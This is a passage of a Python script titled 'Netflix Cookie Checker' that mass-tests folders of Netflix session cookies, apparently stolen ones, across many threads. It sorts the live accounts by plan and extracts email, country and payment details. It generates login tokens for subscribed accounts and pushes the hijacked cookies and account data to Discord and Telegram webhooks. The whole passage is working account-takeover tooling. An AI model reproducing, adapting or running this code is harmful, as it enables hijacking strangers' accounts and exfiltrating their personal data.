            "chat_id": TELEGRAM_CHAT_ID, "text": message[:4000],
            "parse_mode": "HTML", "disable_web_page_preview": True
        }, timeout=20)
    except: pass

# MAIN CHECKER
def check_single_account(cookies, source_file=""):
    """Check a single Netflix account"""
    result = {"status":"invalid","info":{},"cookies":cookies,"nftoken":None,"error":""}
    
    session = requests.Session()
    session.verify = False
    session.headers.update({
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Accept":"application/json, text/plain, */*",
        "Accept-Language":"en-US,en;q=0.9",
    })
    
    for name, value in cookies.items():
        session.cookies.set(name, value, domain=".netflix.com")
    
    try:
        response = session.get(
            "https://www.netflix.com/account/membership",
            timeout=TIMEOUT, allow_redirects=False
        )
        
        if response.status_code == 200 and response.text:
            info = extract_account_info(response.text)
            
            if not info.get('countryOfSignup'):
                result["status"] = "invalid"
                result["error"] = "No country found (bad cookie)"
                return result
            
            is_subscribed = is_subscribed_account(info)
            plan_key, plan_name = derive_plan(info, is_subscribed)
            
            if is_extra_member(info):
                plan_key = "extra_member_premium"
                plan_name = "Premium (Extra Member)"
            
            result["info"] = info
            result["plan_key"] = plan_key
            result["plan_name"] = plan_name
            result["is_subscribed"] = is_subscribed
            result["is_on_hold"] = is_on_hold(info)
            
            # Generate NFToken if subscribed
            if is_subscribed and NFTOKEN_MODE != "false":
                nftoken_data, _ = generate_nftoken(cookies)
                if nftoken_data:
                    result["nftoken"] = nftoken_data
            elif not is_subscribed and NFTOKEN_FOR_FREE and NFTOKEN_MODE != "false":
                nftoken_data, _ = generate_nftoken(cookies)
                if nftoken_data:
                    result["nftoken"] = nftoken_data
            
            result["status"] = plan_key if is_subscribed else "free"
            
        elif response.status_code in [302,303,401,403]:
            result["status"] = "expired"
        else:
            result["status"] = "invalid"
            
    except Exception as e:
        result["status"] = "invalid"
        result["error"] = str(e)
    
    return result
# ORCHESTRATOR
def run_checker():
    """Main function"""
    os.system('cls' if os.name=='nt' else 'clear')
    
    print(f"""
{C.R}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   {C.W}👑 NETFLIX COOKIE CHECKER 👑{C.R}                               ║
║                                                              ║
║   {C.D}                                           {C.R}                ║
║   {C.D}                           {C.R}                                ║
║   {C.D}Made by Hidden Rhythm   {C.R}                                   ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{C.X}
    """)
    
    # Load cookie files
    if not os.path.exists(COOKIES_FOLDER):
        print(f"\n{C.R}[!] '{COOKIES_FOLDER}' folder not found! Creating it...{C.X}")
        os.makedirs(COOKIES_FOLDER)
        print(f"{C.Y}[!] Put your .txt/.json cookie files in the '{COOKIES_FOLDER}' folder and run again.{C.X}")
        return
    
    cookie_files = [f for f in os.listdir(COOKIES_FOLDER) if f.lower().endswith(('.txt','.json'))]
    
    if not cookie_files:
        print(f"\n{C.R}[!] No cookie files found in '{COOKIES_FOLDER}' folder!{C.X}")
        print(f"{C.Y}[!] Add .txt or .json files with Netflix cookies.{C.X}")
        return
    
    # Parse all cookies
    all_sets = []
    print(f"\n{C.C}[📂] LOADING COOKIES...{C.X}\n")
    
    for cf in cookie_files:
        filepath = os.path.join(COOKIES_FOLDER, cf)
        sets = extract_cookie_sets(filepath)
        if sets:
            all_sets.extend(sets)
            print(f"  {C.G}[✓]{C.X} {cf}: {len(sets)} cookie sets")
        else:
            print(f"  {C.Y}[~]{C.X} {cf}: No valid Netflix cookies")
    
    if not all_sets:
        print(f"\n{C.R}[!] No valid Netflix cookies found in any file!{C.X}")
        return
    
    # Deduplicate
    unique_sets = []
    seen = set()
    for s in all_sets:
        nid = s.get('NetflixId','')
        if nid and nid not in seen:
            seen.add(nid)
            unique_sets.append(s)
    
    print(f"\n{C.C}[🔄]{C.X} Total: {len(all_sets)} | After dedup: {len(unique_sets)}")
    
    # Get thread count
    try:
        t = input(f"\n{C.W}[?] Threads (default 30): {C.X}").strip()
        threads = int(t) if t else 30
        threads = max(1, min(200, threads))
    except:
        threads = 30
    
    # Start checking
    stats["total"] = len(unique_sets)
    print(f"\n{C.Y}[🚀] Checking {stats['total']} accounts with {threads} threads...{C.X}\n")
    print(f"{C.D}{'─'*70}{C.X}")
    
    results = []
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_single_account, s): i for i, s in enumerate(unique_sets)}
        
        for future in as_completed(futures):
            try:
                result = future.result()
                
                with lock:
                    stats["checked"] += 1
                    status = result["status"]
                    
                    if status in stats:
                        stats[status] += 1
                    elif status not in ["free","expired","invalid"]:
                        stats[status] = stats.get(status, 0) + 1
                    
                    results.append(result)
                    
                    # Print result
                    info = result.get("info",{})
                    plan_name = result.get("plan_name","")
                    country = decode_value(info.get('countryOfSignup','')) or ''
                    flag = country_flag(country)
                    
                    if result.get("is_subscribed"):
                        if result.get("is_on_hold"):
                            print(f"  {C.Y}⏸️  [{stats['checked']}] ON HOLD | {plan_name} | {country} {flag}{C.X}")
                        else:
                            emoji = "👑" if "premium" in status else "✅"
                            color = C.G if "premium" in status else C.W
                            print(f"  {color}{emoji} [{stats['checked']}] {plan_name} | {country} {flag}{C.X}")
                    elif status == "free":
                        print(f"  {C.B}🆓 [{stats['checked']}] FREE | {country} {flag}{C.X}")
                    elif status == "expired":
                        print(f"  {C.Y}⏰ [{stats['checked']}] EXPIRED{C.X}")
                    else:
                        print(f"  {C.R}❌ [{stats['checked']}] INVALID{C.X}")
                    
            except Exception as e:
                with lock:
                    stats["checked"] += 1
                    stats["errors"] += 1
    
    elapsed = time.time() - start_time
    
    # Process results - save to folders
    print(f"\n{C.C}[💾] SAVING RESULTS...{C.X}\n")
    
    for result in results:
        if result["status"] in ["invalid","expired"]:
            continue
        
        info = result["info"]
        cookies = result["cookies"]
        is_subscribed = result.get("is_subscribed", False)
        plan_key = result.get("plan_key", "unknown")
        plan_name = result.get("plan_name", "Unknown")
        nftoken_data = result.get("nftoken")
        
        # Check duplicate
        email = decode_value(info.get('email','')) or ''
        user_guid = decode_value(info.get('userGuid','')) or f"unknown_{random.randint(10000000,99999999)}"
        dup_key = email.lower() if email else user_guid
        
        with guid_lock:
            if dup_key in processed_emails:
                plan_key = "duplicate"
                stats["duplicate"] = stats.get("duplicate",0) + 1
            else:
                processed_emails.add(dup_key)
        
        # Format output
        output_text, _, _ = format_account_output(info, cookies, is_subscribed, nftoken_data)
        
        # Create folder
        folder_map = {
            "premium":"Premium","standard":"Standard","standard_with_ads":"Standard With Ads",
            "basic":"Basic","mobile":"Mobile","extra_member_premium":"Premium (Extra Member)",
            "free":"Free","duplicate":"Duplicate"
        }
        folder_name = folder_map.get(plan_key, "Other")
        
        if is_subscribed and result.get("is_on_hold"):
            output_dir = os.path.join(OUTPUT_FOLDER, run_folder, folder_name, "On Hold")
        else:
            output_dir = os.path.join(OUTPUT_FOLDER, run_folder, folder_name)
        
        os.makedirs(output_dir, exist_ok=True)
        
        # Filename
        country = decode_value(info.get('countryOfSignup','')) or 'Unknown'
        streams = str(info.get('maxStreams','')).rstrip('}') or '0'
        suffix = ''.join(random.choices(string.ascii_uppercase+string.digits, k=5))
        
        if is_subscribed:
            filename = f"{streams}_{country}_{plan_key}_{user_guid[:8]}_{suffix}.txt"
        else:
            has_payment = "True" if decode_value(info.get('paymentMethodType','')) not in [None,'','UNKNOWN','N/A'] else "False"
            filename = f"Payment-{has_payment}_{country}_{user_guid[:8]}_{suffix}.txt"
        
        filepath = os.path.join(output_dir, filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(output_text)
        
        # Send webhooks
        cookies_str = format_cookies_netscape(cookies)
        send_discord(info, cookies_str, is_subscribed, plan_key, plan_name, nftoken_data)
        send_telegram(info, cookies_str, is_subscribed, plan_key, plan_name, nftoken_data)
    
    # Print summary
    working = stats.get("premium",0)+stats.get("standard",0)+stats.get("standard_with_ads",0)+stats.get("basic",0)+stats.get("mobile",0)+stats.get("extra_member_premium",0)
    
    print(f"""
{C.W}╔══════════════════════════════════════════════════════════════╗
║                    {C.Y}📊 FINAL SUMMARY 📊{C.W}                       ║
╠══════════════════════════════════════════════════════════════╣
║  {C.G}👑 Premium:              {stats.get('premium',0):<6}{C.W}                             ║
║  {C.W}✅ Standard:             {stats.get('standard',0):<6}                             ║
║  {C.C}📺 Standard w/ Ads:      {stats.get('standard_with_ads',0):<6}                             ║
║  {C.B}📱 Basic:                {stats.get('basic',0):<6}                             ║
║  {C.M}📱 Mobile:               {stats.get('mobile',0):<6}                             ║
║  {C.Y}👥 Premium (Extra):      {stats.get('extra_member_premium',0):<6}                             ║
║  {C.B}🆓 Free:                 {stats.get('free',0):<6}                             ║
║  {C.Y}⏰ Expired:              {stats.get('expired',0):<6}                             ║
║  {C.R}❌ Invalid:              {stats.get('invalid',0):<6}                             ║
║  {C.M}🔄 Duplicate:            {stats.get('duplicate',0):<6}                             ║
╠══════════════════════════════════════════════════════════════╣
║  {C.G}Total Working: {working:<6}  |  Time: {time.strftime('%M:%S', time.gmtime(elapsed))}{C.W}                       ║
╚══════════════════════════════════════════════════════════════╝{C.X}
    """)
    
    print(f"{C.G}[✓] Results saved to: {OUTPUT_FOLDER}/{run_folder}/{C.X}")
    print(f"{C.D}Press Enter to exit...{C.X}", end='')
    input()

# RUN
if __name__ == "__main__":
    try:
        run_checker()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Stopped by user.{C.X}")
    except Exception as e:
        print(f"\n{C.R}[!] Error: {e}{C.X}")
